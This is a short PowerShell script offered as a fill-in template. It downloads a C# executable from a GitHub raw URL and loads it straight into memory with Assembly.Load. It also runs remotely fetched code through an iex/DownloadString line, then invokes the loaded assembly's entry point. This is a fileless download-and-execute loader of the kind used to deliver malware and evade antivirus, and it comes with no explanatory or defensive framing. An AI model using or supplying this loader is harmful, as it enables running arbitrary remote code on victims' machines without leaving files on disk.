
$downloadUrl = "https://github.com/imreallyemo1337/a/raw/main/jugg.exe"  # Replace with the link to your C# executable

$assemblyBytes = Invoke-WebRequest -Uri $downloadUrl -UseBasicParsing
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes.Content)

iex (New-Object Net.WebClient).DownloadString('REPLACE')

$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] ('foo', 'bar')))
